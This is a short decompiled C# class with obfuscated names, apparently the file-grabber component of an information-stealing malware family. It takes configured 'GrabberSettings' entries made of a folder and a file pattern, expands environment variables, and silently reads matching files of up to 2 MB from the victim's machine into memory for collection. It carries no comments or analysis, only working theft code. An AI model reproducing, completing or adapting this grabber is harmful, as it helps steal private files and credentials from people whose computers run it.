using System;
using System.Collections.Generic;
using System.IO;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;

namespace NoiseMe.Drags.App.Data.Recovery
{
	// Token: 0x0200018F RID: 399
	public class gg3 : GH9kf<DesktopFile>
	{
		// Token: 0x17000327 RID: 807
		// (get) Token: 0x06000CB3 RID: 3251 RVA: 0x00009940 File Offset: 0x00007B40
		// (set) Token: 0x06000CB4 RID: 3252 RVA: 0x00009948 File Offset: 0x00007B48
		public IEnumerable<string> GrabberSettings { get; set; }

		// Token: 0x06000CB5 RID: 3253 RVA: 0x00009951 File Offset: 0x00007B51
		public gg3()
		{
			this.GrabberSettings = new List<string>();
		}

		// Token: 0x06000CB6 RID: 3254 RVA: 0x00027A18 File Offset: 0x00025C18
		public List<DesktopFile> EnumerateData()
		{
			List<DesktopFile> list = new List<DesktopFile>();
			if (this.GrabberSettings == null)
			{
				return list;
			}
			foreach (string text in this.GrabberSettings)
			{
				if (!string.IsNullOrEmpty(text))
				{
					string[] array = text.Split(new char[]
					{
						'|'
					});
					if (array.Length == 2)
					{
						foreach (string fileName in Directory.GetFiles(Environment.ExpandEnvironmentVariables(array[0]), array[1], SearchOption.TopDirectoryOnly))
						{
							try
							{
								FileInfo fileInfo = new FileInfo(fileName);
								if (fileInfo.Length <= 2097152L)
								{
									list.Add(new DesktopFile
									{
										FileData = File.ReadAllBytes(fileInfo.FullName),
										Filename = fileInfo.Name
									});
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			return list;
		}
	}
}
